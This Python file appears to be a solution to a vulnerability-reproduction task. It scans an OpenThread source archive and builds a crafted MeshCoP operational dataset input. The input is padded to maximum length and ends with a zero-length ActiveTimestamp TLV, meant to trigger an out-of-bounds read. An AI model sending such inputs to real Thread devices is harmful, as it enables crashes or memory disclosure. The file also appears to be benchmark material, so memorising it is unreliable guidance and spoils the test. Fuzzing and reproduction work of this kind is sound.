import os
import re
import tarfile
from typing import Dict, Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        text_files: List[Tuple[str, str]] = []
        fuzzers: List[Tuple[str, str]] = []

        defines: Dict[str, str] = {}
        assigns: Dict[str, str] = {}

        def add_define_line(line: str) -> None:
            m = re.match(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?://.*)?$', line)
            if not m:
                return
            name, val = m.group(1), m.group(2).strip()
            if len(val) > 200:
                return
            defines.setdefault(name, val)

        def add_assigns_from_text(s: str) -> None:
            for m in re.finditer(r'\b([A-Za-z_]\w*)\s*=\s*([^,}\n/]+)', s):
                name = m.group(1)
                val = m.group(2).strip()
                if len(val) > 200:
                    continue
                assigns.setdefault(name, val)

        def safe_clean_expr(expr: str) -> str:
            expr = re.sub(r'/\*.*?\*/', ' ', expr, flags=re.S)
            expr = re.sub(r'//.*', ' ', expr)
            expr = expr.strip().strip(';').strip()
            expr = re.sub(r'\bstatic_cast\s*<[^>]+>\s*\(', '(', expr)
            expr = re.sub(r'\breinterpret_cast\s*<[^>]+>\s*\(', '(', expr)
            expr = re.sub(r'\bconst_cast\s*<[^>]+>\s*\(', '(', expr)
            expr = re.sub(r'\bdynamic_cast\s*<[^>]+>\s*\(', '(', expr)
            expr = re.sub(r'\(\s*(?:u?int(?:8|16|32|64)_t|unsigned|signed|char|short|int|long)\s*\)', '', expr)
            expr = expr.replace('U', '').replace('u', '').replace('L', '').replace('l', '')
            return expr.strip()

        resolved_cache: Dict[str, Optional[int]] = {}

        def try_parse_int_literal(s: str) -> Optional[int]:
            s = s.strip()
            m = re.match(r'^(0x[0-9A-Fa-f]+|\d+)$', s)
            if not m:
                return None
            try:
                return int(m.group(1), 0)
            except Exception:
                return None

        def resolve_symbol(name: str, depth: int = 0) -> Optional[int]:
            if name in resolved_cache:
                return resolved_cache[name]
            if depth > 20:
                resolved_cache[name] = None
                return None
            expr = assigns.get(name)
            if expr is None:
                expr = defines.get(name)
            if expr is None:
                resolved_cache[name] = None
                return None
            expr = safe_clean_expr(expr)
            lit = try_parse_int_literal(expr)
            if lit is not None:
                resolved_cache[name] = lit
                return lit
            if re.fullmatch(r'[A-Za-z_]\w*', expr):
                val = resolve_symbol(expr, depth + 1)
                resolved_cache[name] = val
                return val

            def repl(m: re.Match) -> str:
                sym = m.group(0)
                v = resolve_symbol(sym, depth + 1)
                if v is None:
                    return sym
                return str(v)

            expr2 = re.sub(r'\b[A-Za-z_]\w*\b', repl, expr)
            expr2 = expr2.strip()
            allowed = set("0123456789abcdefABCDEFxX()+-*/|&<>~ \t")
            if any(c not in allowed for c in expr2):
                resolved_cache[name] = None
                return None
            try:
                val = eval(expr2, {"__builtins__": None}, {})
                if isinstance(val, bool):
                    val = int(val)
                if not isinstance(val, int):
                    resolved_cache[name] = None
                    return None
                resolved_cache[name] = val
                return val
            except Exception:
                resolved_cache[name] = None
                return None

        max_len: Optional[int] = None

        needed_names = [
            "OT_OPERATIONAL_DATASET_MAX_LENGTH",
            "kActiveTimestamp",
            "kPendingTimestamp",
            "kDelayTimer",
            "kChannelMask",
            "kExtendedPanId",
            "kNetworkName",
            "kNetworkKey",
            "kPskc",
            "kMeshLocalPrefix",
            "kSecurityPolicy",
            "kChannel",
            "kPanId",
        ]

        def decode_bytes(b: bytes) -> str:
            return b.decode("utf-8", "ignore")

        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for mem in members:
                if not mem.isfile():
                    continue
                name = mem.name
                lower = name.lower()
                if not (lower.endswith((".h", ".hpp", ".c", ".cc", ".cpp"))):
                    continue
                if mem.size <= 0 or mem.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(mem)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                s = decode_bytes(data)

                for line in s.splitlines():
                    if "#define" in line:
                        add_define_line(line)

                if any(nm in s for nm in needed_names):
                    add_assigns_from_text(s)

                if "LLVMFuzzerTestOneInput" in s:
                    fuzzers.append((name, s))

                if max_len is None and "OT_OPERATIONAL_DATASET_MAX_LENGTH" in s:
                    m = re.search(r'^\s*#\s*define\s+OT_OPERATIONAL_DATASET_MAX_LENGTH\s+(\d+)\s*$', s, flags=re.M)
                    if m:
                        try:
                            max_len = int(m.group(1), 10)
                        except Exception:
                            pass

                if any(k in s for k in ("Dataset::IsTlvValid", "IsTlvValid", "MeshCoP", "OperationalDataset")):
                    text_files.append((name, s))

        if max_len is None:
            v = resolve_symbol("OT_OPERATIONAL_DATASET_MAX_LENGTH")
            if v is not None and 8 <= v <= 4096:
                max_len = v
        if max_len is None:
            max_len = 254

        def resolve_any(names: List[str], default: int) -> int:
            for nm in names:
                v = resolve_symbol(nm)
                if v is not None and 0 <= v <= 255:
                    return v
            return default

        # Defaults aligned with common OpenThread MeshCoP Dataset TLV type values.
        t_active = resolve_any(["kActiveTimestamp", "kTlvActiveTimestamp", "kActiveTimestampTlv", "OT_MESHCOP_TLV_ACTIVE_TIMESTAMP"], 9)
        t_pending = resolve_any(["kPendingTimestamp", "kTlvPendingTimestamp", "kPendingTimestampTlv", "OT_MESHCOP_TLV_PENDING_TIMESTAMP"], 8)
        t_delay = resolve_any(["kDelayTimer", "kTlvDelayTimer", "kDelayTimerTlv", "OT_MESHCOP_TLV_DELAY_TIMER"], 7)
        t_channelmask = resolve_any(["kChannelMask", "kTlvChannelMask", "kChannelMaskTlv", "OT_MESHCOP_TLV_CHANNEL_MASK"], 11)
        t_extpan = resolve_any(["kExtendedPanId", "kTlvExtendedPanId", "kExtendedPanIdTlv", "OT_MESHCOP_TLV_EXTENDED_PANID"], 2)
        t_netname = resolve_any(["kNetworkName", "kTlvNetworkName", "kNetworkNameTlv", "OT_MESHCOP_TLV_NETWORK_NAME"], 3)
        t_channel = resolve_any(["kChannel", "kTlvChannel", "kChannelTlv", "OT_MESHCOP_TLV_CHANNEL"], 0)
        t_panid = resolve_any(["kPanId", "kTlvPanId", "kPanIdTlv", "OT_MESHCOP_TLV_PANID"], 1)

        # Decide which invalid TLV to place at end; ActiveTimestamp preferred (8-byte reads).
        bad_type = t_active
        bad_len = 0

        # Heuristic prefix inference from likely dataset-related fuzzer.
        prefix = 0
        if fuzzers:
            def fuzzer_score(item: Tuple[str, str]) -> int:
                _, s = item
                score = 0
                for kw, pts in [
                    ("otOperationalDatasetTlvs", 10),
                    ("OT_OPERATIONAL_DATASET_MAX_LENGTH", 10),
                    ("otDatasetSetActiveTlvs", 10),
                    ("otDatasetSetPendingTlvs", 10),
                    ("MeshCoP", 5),
                    ("Dataset", 5),
                    ("mTlvs", 3),
                    ("mLength", 3),
                ]:
                    if kw in s:
                        score += pts
                return score

            fuzzer_name, fuzzer_text = max(fuzzers, key=fuzzer_score)

            m = re.search(r'\bmemcpy\s*\([^,]*\bmTlvs\b[^,]*,\s*(?:aData|data)\s*\+\s*(\d+)\s*,', fuzzer_text)
            if m:
                try:
                    start_off = int(m.group(1))
                except Exception:
                    start_off = 0
            else:
                start_off = 0

            len_from_first = bool(re.search(r'\bmLength\b\s*=\s*(?:static_cast<[^>]+>\s*\()?(\w+)\s*\[\s*0\s*\]', fuzzer_text))
            if len_from_first and start_off >= 1:
                prefix = start_off
            else:
                prefix = 0

        def tlv(t: int, val: bytes) -> bytes:
            if not (0 <= t <= 255):
                t = t & 0xFF
            ln = len(val)
            if ln > 255:
                val = val[:255]
                ln = 255
            return bytes([t & 0xFF, ln & 0xFF]) + val

        dataset_len = max_len
        filler_len = dataset_len - 2  # reserve for final invalid TLV header

        # Build filler TLVs with unique types; main padding via ChannelMask.
        fixed_candidates: List[Tuple[str, int, bytes]] = []

        # ExtendedPanId: 8 bytes
        fixed_candidates.append(("extpan", t_extpan, b"\x01\x23\x45\x67\x89\xab\xcd\xef"))

        # Optional small TLVs for alignment if needed
        # Channel TLV: 3 bytes: [channelPage=0][channel=11] big-endian
        fixed_candidates.append(("channel", t_channel, b"\x00\x00\x0b"))
        # PanId TLV: 2 bytes big-endian
        fixed_candidates.append(("panid", t_panid, b"\x12\x34"))

        # NetworkName length can vary (1..16)
        nn_type = t_netname

        def build_channel_mask_value(cm_len: int) -> bytes:
            if cm_len <= 0:
                return b""
            # Preferred: entries with page=0, masklen=4 (6 bytes each)
            if cm_len % 6 == 0 and cm_len >= 6:
                n = cm_len // 6
                entry = bytes([0, 4, 0xFF, 0xFF, 0xFF, 0xFF])
                return entry * n
            # Fallback: single entry with variable mask length (may be rejected by strict validators)
            if cm_len >= 2:
                mask_len = cm_len - 2
                if mask_len > 255:
                    mask_len = 255
                return bytes([0, mask_len]) + (b"\xFF" * mask_len)
            return b"\x00\x00"[:cm_len]

        # Try to find a combination such that channelmask length is multiple of 6.
        best: Optional[Tuple[bytes, bytes, bytes]] = None  # (channelmask_tlv, netname_tlv, other_tlvs)
        # Options subsets (by indices) among fixed_candidates; keep extpan always if possible.
        fixed_indices = list(range(len(fixed_candidates)))

        # Prefer include extpan, and avoid too many extra TLVs.
        subsets: List[Tuple[int, ...]] = []
        for mask in range(1 << len(fixed_indices)):
            idxs = tuple(i for i in fixed_indices if (mask >> i) & 1)
            subsets.append(idxs)
        subsets.sort(key=lambda idxs: (0 if 0 in idxs else 1, len(idxs)))

        for idxs in subsets:
            fixed_tlvs = []
            used_types = set()
            fixed_total = 0
            ok = True
            for i in idxs:
                _, t, v = fixed_candidates[i]
                if t in used_types:
                    ok = False
                    break
                used_types.add(t)
                part = tlv(t, v)
                fixed_total += len(part)
                fixed_tlvs.append(part)
            if not ok:
                continue
            if fixed_total >= filler_len:
                continue

            # Choose NetworkName length to make ChannelMask value length divisible by 6.
            for nn_len in range(1, 17):
                netname_tlv = tlv(nn_type, b"A" * nn_len)
                total_other = fixed_total + len(netname_tlv)
                if total_other >= filler_len:
                    continue
                cm_total = filler_len - total_other
                cm_len = cm_total - 2
                if cm_len < 6:
                    continue
                if cm_len > 255:
                    continue
                if cm_len % 6 != 0:
                    continue
                cm_val = build_channel_mask_value(cm_len)
                if len(cm_val) != cm_len:
                    continue
                cm_tlv = tlv(t_channelmask, cm_val)
                if len(cm_tlv) != cm_total:
                    continue
                other = b"".join(fixed_tlvs) + netname_tlv
                payload = cm_tlv + other
                if len(payload) == filler_len:
                    best = (cm_tlv, netname_tlv, b"".join(fixed_tlvs))
                    break
            if best is not None:
                break

        if best is None:
            # Last-resort filler: ChannelMask with variable masklen, plus NetworkName, plus fixed TLVs
            fixed_tlv_blob = tlv(t_extpan, b"\x01\x23\x45\x67\x89\xab\xcd\xef")
            netname_tlv = tlv(nn_type, b"A" * 16)
            total_other = len(fixed_tlv_blob) + len(netname_tlv)
            if total_other < filler_len:
                cm_total = filler_len - total_other
                cm_len = cm_total - 2
                if cm_len < 2:
                    cm_len = 2
                    cm_total = cm_len + 2
                cm_val = build_channel_mask_value(cm_len)
                cm_tlv = tlv(t_channelmask, cm_val)
                filler = cm_tlv + fixed_tlv_blob + netname_tlv
                filler = filler[:filler_len].ljust(filler_len, b"\x00")
            else:
                filler = (fixed_tlv_blob + netname_tlv)[:filler_len].ljust(filler_len, b"\x00")
        else:
            cm_tlv, netname_tlv, fixed_blob = best
            filler = cm_tlv + fixed_blob + netname_tlv
            if len(filler) != filler_len:
                filler = filler[:filler_len].ljust(filler_len, b"\x00")

        dataset = filler + bytes([bad_type & 0xFF, bad_len & 0xFF])
        dataset = dataset[:dataset_len].ljust(dataset_len, b"\x00")

        if prefix == 0:
            return dataset

        # If there is an inferred prefix, set the first byte(s) to request full length if it looks like a length prefix.
        # Keep it simple: fill prefix with max_len, then dataset bytes.
        pref = bytes([dataset_len & 0xFF]) + (b"\x00" * (prefix - 1))
        return (pref + dataset)[:prefix + dataset_len]